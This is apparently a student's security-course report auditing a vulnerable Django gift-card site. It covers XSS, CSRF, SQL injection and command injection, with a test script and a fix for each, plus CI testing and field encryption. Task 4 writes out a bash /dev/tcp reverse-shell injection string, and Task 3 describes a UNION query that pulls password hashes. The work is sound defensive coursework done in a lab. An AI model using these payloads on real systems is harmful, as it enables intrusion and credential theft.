# Part 1 Auditing and Test Cases
Note: Each screenshot has the time, either printed in the terminal window using `date` or at the top of the VM window.
## Task 1: XSS
### 1A
I started by searching the website. The only forms I saw were Login (username and password), Register (username and password), buy (number), and gift (number and account name). I tested running a simple `<script> alert(0); </script>` in a few ways in each. Everything except the Account field in the "gift" section had input filtering. I tried to print the sessionid cookie, but I could not. Used the same gift input field to create and test x,y, and z cookies. All three would print in the alert even with the "Secure" flag set. However, the sessionid cookie also has the "HttpOnly" flag set. This flag is prevents the cookie from being displayed by the alert.
I found the vulnerable source code in the `views.py` file. The line has a commnet stating that compliance requires invalid login accounts to be displayed, and a raw HTTP response is served. This will need to be filtered.
![Pic2](/Reports/artifacts/bac369-t1a.png)

### 1B
###### Code: [bac369-cmdi.py](/bac369-cmdi.py)
I researched the `requests` library and the session object. I created a session and used the post method to `login.html` with valid accoutn details. I then sent another post request to the vulnerable `gift.html` page.
At first, this did not work, and I recieved an "ERROR NOT LOGGED IN" response. After troubleshooting and more research. I learned the `secure` flag might be preventing the session from operating properly in this fashion.
In my script, I sanitize the secure flag to `False`.
After running my code again, I saw my XSS script in the response. To parse the response, I simply search for `<script>` in the response. If it is found it prints `Vulnerable to XSS!`.
![Pic2](/Reports/artifacts/bac369-t1b.png)

### 1C
I was able to sanitize the `target_user` value by importing the python `html` module and using `html.escape(target_user)` to escape reserved characters from HTML markup. As you can see the $<script>$ appears encoded for markup.
![Pic2](/Reports/artifacts/bac369-t1c.png)

### 1D

My code still checks for the $<script>$ line as you can see in the resulting page the html still shows $<script>$ in the HTML. However, the comparison for the check is being made on the raw HttpResponse not the html. I recommented in the line that prints the response and you can see the $<script>$ is now `&lt;script&gt;` which is safe. It now prints "Not Vulnerable to XSS!".

![Pic2](/Reports/artifacts/bac369-t1cd.png)

## Task 2: CSRF
### 2A
###### HTML: [htmltest.html](/htmltest.html)
Based off my observations from Task 1. The `POST` method on `gift.html` would likely be vulnerable to CSRF. I did not see any csrfmiddleware tokens, on the website.
To test this, I made a HTML page (LINKTOBEADDED). As suggested I hosted the webpage using 'python3 -m http.server 8080' and used the browser to visit the webpage at `127/0.0.1:8080/htmltest&html`.
I modified the webgpage from the sample at https://portswigger.net/web-security/csrf. The modifications included creating a second input field, changing the POST address, and setting the `id`, `name`, `class`, and `value` to match the fields on `gift.html` page.
In the image below you can see that I was successfully able to gift a 201 value card to LEGITLOGIN by visting the link to `htmltest.html`.

![Pic2](/Reports/artifacts/bac369-t2a.png)

### 2B
###### Code: [bac369-csrf.py](/bac369-csrf.py)
When I first starting looking into this task I misread the instructions and tries to exploit the vulnerability. I realised the attack vector is in essence very similar to XSS with the payload delivered in a POST request, and writing a script for such was essentially the same. I also learned the the python3 requests library does not render html and run javascript like a browser would.
I then reread the instructions.
 THe csrf script instead inspects the `GET` response from the `gift.html` which parses the response to look specifically for "csrfmiddlewaretoken" in the HTML. I saw that crsf tokens could be passed in HTTP header aswell, but since the assignment specifically states "in a HTML element", I believe my parsing method is sufficient.
Since the presence of this element does not require a login, the session does not login. How I modified my XSS script to use the `csrfmiddlewaretoken` to successfully login and send gifts.
![Pic2](/Reports/artifacts/bac369-t2b.png)
### 2C
To add CSRF protection to the site. I added 'django.middleware.csrf.CsrfViewMiddleware' to `settings.py`, and `{% csrf_token %}` to gift.html.
![Pic2](/Reports/artifacts/bac369-t2c.png)

##2D Running `bac369-csrf.py` After the adjustsments have been made prints "NOT VULNERABLE TO CSRF" since the response contains a `csrfmiddlewaretoken`. This technique is not ideal. 1. It exclusively looks for `csrfmiddlewaretoken`, which may not be the string used for the token. 2. As previously mentions the, the CSRF token could be implemented in the header, this will not find that. 3. Since the script, does not require login, the script will not be able to access and parse pages or HTML elements that do require logins.

![Pic2](/Reports/artifacts/bac369-t2d.png)

## Task 3: SQLI
### 3A
###### Gftcard File: [injection.gftcrd](/injection.gftcrd)
This task aactually took more time than any other. Regardless of what query I tested. I would get django type errors. After, much time testing repeatedly and getting the same errors I finally looked into it, and I believe my findings here are sufficient.
Process:
1. I have had very little experience with SQL, so I had trouble understanding and visualizing how  the database works. To aid me in this task I downloaded SQLite. This tool allowed me to open the database and visualize how it is strutured. It also allowed me to practice SQL queries.
2. I looked at the source code and saw the vulnerability in the `views.py` `use_card` section. card_query uses raw sql and passes an unsafe `signature` string to it. It is unsafe because the there are quotes aroundthe format operator, %s and the signature variable is is unsafe when passed as such `% signature`. The signature string is easily alterable field in the gftcard file.
3. Using the string in the vulnerable field in the source code I use SQLite and SQL UNION to try to get the passwords out of the database. UNION is necessary because the Django raw() method can only perform one query at a time, UNION allows multiple queries to act as one. As you can see in the picture below I was able to construct a successful query.
![Pic2](Reports/artifacts/bac369-t3a.png)
4. After testing various permutations of the query. I would get no results or `memtype` errors. Based off the source code, it looks as though the queries are eventually supposed to be rendered to the html page. I thought is was an error in my query, but after investigating the django error on the browser as you can below. My queries were successful and the hashed passwords were getting selected and passed to the card_query_string. The errors were coming from  `card = Card.objects.get(data=card_data)` -> `data= models.Binaryfield(unique = True)` method in models.py. After investigating this did not seem like an error worth looking into too in depth, I do not believe it is an error I would have much control over.
5. The error reported from Django is enough to show that the web application and database are vulnerable to an SQLi attack. The error (below) shows all the hashed and salted passwords for the users I have made. Even if this error page was never shown to users in a live enviroment, it is vulnerable. The query I used to pull the passwords for the current user and adminstrator is a chain of UNION and uses the id field to pull the username and password. I was able to find the id by using other SQL queries injected into application, such as `SELECT username from LegacySite_user where id is not null UNION SELECT id from LegacySite_user where id is not null`.
![Pic2](/Reports/artifacts/bac369-3a2.png)

### 3B
###### Code: [bac369-sqli.py](/bac369-sqli.py)
My python code parses the response and searches for the 'adminstrator' string if found, it prints "VULNERABLE TO SQLI!". Since it is parsing the response regardless if the error is thrown or if query is rendered to the page. Searching for the string should yield accurate results.
As you can see below the python SQL injection was successful and the 'administrator' string was found in the response.
![Pic2](/Reports/artifacts/bac369-t3b.png)

### 3C
TO fix this issue I removed the `'\'`s amd quotes around the `%s`, to prevent escaping, and changed signature to be passed as a list of params, as such `[signature]`. This is much safer and fixed the SQL injection point.
(Shares with image with 3D)

### 3D
The modified code now pirnts "NOT VULNERABLE TO SQLI!" if 'administrator' is not found in the response. Running the program resulted in 'NOT VULNERABLE TO SQLI'.

![Pic2](/Reports/artifacts/bac369-t3cd.png)

## Task 4: CMDI
### 4A
When looking for the vulnerability, I was not sure if the .gftcard file or the card path name would be the vulnerability. I looked into the source code below in the use_card section in extras.py. I noticed the comments so I directed my attention to looking through this section primarily. First, I thought the `open()`  would be vulnerable. After looking through documentation the, I learned `popen()` is vulnerable to injection, but `open()` is not. I then noticed the `system()` fucntion which is vulnerable and the string inside.
![Pic2](/Reports/artifacts/bac369-t4a.png)
In order to break out of the string I used `;` then the command string `ls -la` and finished with another `;`. I saw the server terminal printed the results successfully.
Moving to the reverse shell I again used ';' to break out and start a new command. The command I built was `;/bin/bash -c "/bin/bash -i > /dev/tcp/127.0.0.1/8888 0<&1 2>";` This runs /bin/bash in a bin/bash and redirects the standard input and error to IP 127.0.0.1 on port 8888. I got a reverse root shell, then printed the `hostname;date; id`.
The gftcard file I used was simply an invalid gftcard with random letters. The only reason for this is to bypass the card read check and enter the code with the `system()` call.
![Pic2](/Reports/artifacts/bac369-t4a2.png)

### 4B
###### Code: [bac369-cmdi.py](/bac369-cmdi.py)
The code is another derivation of the testing code of previous vulnerabilities with cookies made insecure and crsftokens added to POST.
THe changes include a POST to `/usecard.html`, a file field of 'card_data' with the gftcard name, and a change to the values `card_supplied = True`, and `card_fname` which contains the commands. This code runs a python server and listens for a response. Since I have already shown I can achieve a reverse shell and we are looking for the existance of the vulnerability, instead of reverse shell commands, I simply send the listening server "YOUVEBEENHAD" the complete command is `;/bin/bash -c "/bin/bash -i > /dev/tcp/127.0.0.1/8888 0<&1 2>";`. The response is parsed and if the the string was successfully echoed it prints 'VULNERABLE TO CMDI!'.
![Pic2](/Reports/artifacts/bac369-t4b.png)

### 4C
To fix the vulnerability I used shlex.quote. This sanitizes strings and prevents removes the prescence of command escape characters like `;`, `>`, `|`. Specifically, I use shlex.quote to sanitize the `card_path_name` variable so that any escape characters used to inject commands are removed. (Shares with image with 4D)

### 4D
To test if there are not vulnerabilities. I set a timeout to the the server. The python server listens and accepts connections for 4 seconds. If there is a response, it is parsed for the injected echo string. If it times out there was no reponse and it prints 'NOT VULNERABLE TO CMDI'.

# Part 2: Automated Regression & Database Encryption

![Pic2](/Reports/artifacts/bac369-t4cd.png)

## Task 5
###### Code: [bac369-regression.yml](/.github/workflows/bac369-regression.yml)
I had two main difficulties with this task: running the server and testing simulataneously and managing dependencies.
For the dependencies, I realized I had to install dependencieson both the default user in the runner and on `sudo` separately. I looked into how to avoid this, but I could not find anything and this worked.
To run the server, I used `sudo Giftcard_Site/manage.py runserver 8989 &`. The `&` allowed the server to run in the background and the consecutive taks were able to run.
I was able to successfully run all the tests automatically on the server.
###### Link to actions: [Github Actions Page](https://github.com/bac369/bac369-appsec2/runs/5712183949?check_suite_focus=true)
![Pic2](/Reports/artifacts/bac369-5.png)

## Task 6
### 6a
I used the `encryption_fields` library to encrypt the `Card` models. The specific field I chose to encrypt was the `data` field in the `Card` model. This field contains the account details of the `Card`, the amount on the card, and the unique crypto signature. Even though it is not yet implemented it is implied to be a unique and important field worth been encrypted.
I used sqlite3 to traverse through the `db.sqlite3` file. To print the entire database `.schema LegacySite_card`. In the image below, the last two entries 29 and 30, have the encrypted `data` field. All of the sensitive data is no longer viewable without decryption.
While the data is now more secure and hidden from plain sight. Administration of the database is more difficult. Firstly, records all need to be encrypted and decrypted which has a technical overhead on a large scale, and second, finding specifc records is now a more difficult process as the encrypted fields cannot be sorted or searched for. Also since fields in the database are hidden now, any attempts of manipulating the card (as we successfully did before) are harder to identify. This could be mitigated by instead encrypting specifically the sensitive fields within the data, like the the entire 'record' field or 'signature' field which is itself (supposed to be) a unique cryptographic identifier to validate the authentcity of a card, exploitation of which could be used to create a spoofed, valid card with any value. Having only these fields encrypted, allow an ease of administration and require less repeated encryption and decryption of entries.
![Pic2](/Reports/artifacts/bac369-t6a.png)

### 6b
With a comrpomised key, all entries encrypted using that key need to be decrypted and reencrypted. I manually did this using Fernet and the old key to decrypt the entry in the database. I then rencrypted it using the new key and manually entered the entry back in. Below my decryption and rencryption process, and the reencrypted results in the databse.
Compromise of an encryption key is a major security risk and should be immediately remedied. With the current implementation of the database. Every entry needs to be decrypted and reencrypted with the new key. While it can be automated, this process is technically intensive and is dangerous because of the risk of corrupted data.
The better alternative would be to have a backup database not in production, more locked down that is already encrypted with a separate key. This database can be verified, copied and moved into production with another new key. Once changes between the production database and backup are merged the compromised database can be dismantled. Even if the key is not compromiseed, this process shouild be carried out reguarly, so keys can be rotated on a regualr basis. The longer a key is in use the higher the likelihood of key compromise and exploitation of the database.
![Pic2](/Reports/artifacts/bac369-t6b.png)
